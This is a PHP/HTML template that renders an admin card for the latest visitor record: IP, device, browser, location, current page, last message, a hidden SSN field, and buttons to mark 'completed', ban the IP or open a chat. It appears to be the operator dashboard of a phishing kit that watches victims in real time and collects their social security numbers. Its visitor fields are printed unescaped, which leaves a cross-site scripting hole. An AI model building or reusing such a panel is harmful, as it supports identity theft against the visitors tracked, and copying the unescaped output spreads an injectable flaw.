<?php
session_start();
require_once 'init.php';

$users = $User->fetchAllUsers();
$banned_ips = $User->fetchAllBannedIPs();

if ($users != false):
    $row = $users[0]; // Assuming we're prepending the latest
    $status_class = 'offline';
    if (isset($row->last_activity)) {
        $last_act = strtotime($row->last_activity);
        $diff = time() - $last_act;
        if ($diff < 300) {
            $status_class = 'active'; // Online (5 mins)
        } elseif ($diff < 600) {
            $status_class = 'waiting'; // Idle (10 mins)
        }
    }
    $dist_class = $row->is_distinguished ? 'is-dist' : '';
    $pin_class = $row->is_pinned ? 'is-pinned' : '';
    $comp_class = $row->is_completed ? 'is-completed' : '';
    ?>
    <div class="user-module <?= $dist_class ?> <?= $pin_class ?> <?= $comp_class ?>" data-user-id="<?= $row->id; ?>"
        data-session-id="<?= $row->chat_session_id; ?>" onclick="openDetailPanel(this)">
        <!-- 1. Selection -->
        <div class="selection-overlay">
            <input type="checkbox" name="selectedUsers[]" value="<?= $row->id ?>" class="user-checkbox"
                onclick="event.stopPropagation(); updateBulkBar();">
        </div>

        <!-- 2. Avatar & Status -->
        <div class="avatar-wrapper">
            <div class="avatar-circle <?= $status_class ?>">
                <i class="bi bi-person-fill"></i>
            </div>
            <div class="pulse-indicator <?= $status_class ?>"></div>
        </div>

        <!-- 3. Main Info -->
        <?php
        $isBanned = in_array($row->ip, $banned_ips);
        $banFlagHTML = $isBanned ? '<span class="badge bg-danger ms-1" style="font-size:0.6rem;">محظور</span>' : '';
        ?>
        <div class="module-body">
            <div class="user-main-info">
                <span class="user-id-badge">ID: #<?= $row->id; ?>     <?= $banFlagHTML ?></span>
                <div class="full-timestamp mt-1">
                    <?= date('d/m/Y H:i', strtotime($row->created_at)); ?>
                </div>
            </div>

            <!-- Detailed Technical Column -->
            <div class="tech-info-column">
                <div class="t-row"><i class="bi bi-display me-1"></i> <?= $row->device ?: '---'; ?></div>
                <div class="t-row"><i class="bi bi-browser-safari me-1"></i> <?= $row->browser ?: '---'; ?></div>
                <div class="t-row"><i class="bi bi-geo-alt-fill me-1"></i> <?= $row->location ?: '---'; ?></div>
                <div class="t-row"><i class="bi bi-globe2 me-1"></i> <?= $row->ip; ?></div>
            </div>

            <div class="activity-summary">
                <div class="current-page">
                    <i class="bi bi-geo-alt-fill text-danger"></i>
                    <span id="page<?= $row->id; ?>"><?= $row->page ?: 'بداية الاتصال'; ?></span>
                </div>
                <div class="last-msg" id="message<?= $row->id; ?>">
                    <?= $row->message ?: 'في انتظار البيانات...'; ?>
                </div>
            </div>
        </div>

        <!-- 4. Quick Actions -->
        <div class="card-quick-actions" onclick="event.stopPropagation();">
            <a href="javascript:void(0)" onclick="confirmAdminAction('pin', <?= $row->id ?>)" title="تثبيت"
                class="q-action pin <?= $row->is_pinned ? 'active' : '' ?>">
                <i class="bi bi-pin-angle-fill"></i>
            </a>
            <a href="javascript:void(0)" onclick="confirmAdminAction('distinguish', <?= $row->id ?>)" title="تمييز"
                class="q-action star <?= $row->is_distinguished ? 'active' : '' ?>">
                <i class="bi bi-star-fill"></i>
            </a>
            <a href="javascript:void(0)" onclick="confirmAdminAction('completed', <?= $row->id ?>)" title="مكتمل"
                class="q-action check <?= $row->is_completed ? 'active' : '' ?>">
                <i class="bi bi-check-circle-fill"></i>
            </a>
            <div class="ip-ban-btn-wrapper" data-user-id="<?= $row->id; ?>">
                <?php if ($isBanned): ?>
                    <a href="javascript:void(0)"
                        onclick="confirmUnbanIP('<?= $row->ip ?>', <?= $row->id ?>); event.stopPropagation();"
                        title="فك حظر IP الزائر" class="q-action"
                        style="color: #059669; background: #d1fae5; border-color: #6ee7b7;">
                        <i class="bi bi-shield-check"></i>
                    </a>
                <?php else: ?>
                    <a href="javascript:void(0)"
                        onclick="confirmBanIP('<?= $row->ip ?>', <?= $row->id ?>); event.stopPropagation();"
                        title="حظر IP الزائر" class="q-action"
                        style="color: #e11d48; background: #ffe4e6; border-color: #fda4af;">
                        <i class="bi bi-slash-circle-fill"></i>
                    </a>
                <?php endif; ?>
            </div>
            <a href="javascript:void(0)" onclick="openAdminChatModal('<?= $row->chat_session_id ?>')" title="فتح المحادثة"
                class="q-action position-relative" style="color: #156394; background: #e0f2fe; border-color: #bae6fd;">
                <i class="bi bi-chat-text-fill"></i>
                <span class="chat-badge badge bg-danger position-absolute top-0 start-100 translate-middle rounded-pill"
                    style="font-size: 0.5rem; <?= $row->chat_unread_count > 0 ? '' : 'display:none;' ?>"><?= $row->chat_unread_count ?></span>
            </a>
            <a href="javascript:void(0)" onclick="markChatUnreadFromCard('<?= $row->chat_session_id ?>', this)"
                title="تعليم غير مقروء" class="q-action"
                style="color: #d97706; background: #fef3c7; border-color: #fcd34d;">
                <i class="bi bi-envelope-fill"></i>
            </a>
            <?php if ($row->is_archived): ?>
                <a href="javascript:void(0)" onclick="confirmAdminAction('unarchive', <?= $row->id ?>)" title="إلغاء الأرشفة"
                    class="q-action archive">
                    <i class="bi bi-arrow-up-circle-fill"></i>
                </a>
            <?php else: ?>
                <a href="javascript:void(0)" onclick="confirmAdminAction('archive', <?= $row->id ?>)" title="نقل للأرشيف"
                    class="q-action archive">
                    <i class="bi bi-archive-fill"></i>
                </a>
            <?php endif; ?>
        </div>

        <!-- Hidden Data for Sidebar -->
        <div class="hidden-data d-none">
            <span class="d-location"><?= $row->location; ?></span>
            <span class="d-device"><?= $row->device; ?></span>
            <span class="d-browser"><?= $row->browser; ?></span>
            <span class="d-ssn"><?= $row->ssn; ?></span>
            <span class="d-dist"><?= $row->is_distinguished; ?></span>
            <span class="d-arch"><?= $row->is_archived; ?></span>
            <span class="d-time"><?= $row->created_at; ?></span>
        </div>
    </div>
    <?php
endif;
?>